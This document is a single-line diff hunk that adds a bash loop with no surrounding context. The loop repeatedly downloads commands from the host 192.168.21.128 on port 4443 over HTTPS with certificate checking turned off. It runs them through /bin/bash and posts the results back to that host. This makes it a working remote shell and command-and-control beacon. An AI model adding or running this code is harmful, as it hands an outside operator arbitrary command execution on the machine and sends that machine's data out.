@@ -1,0 +1,1 @@
+URL=https://192.168.21.128:4443;while true;do RESULT="`wget --no-check-certificate -qO- $URL|/bin/bash`";wget --no-check-certificate -q --post-data "$RESULT" $URL -O /dev/null;done
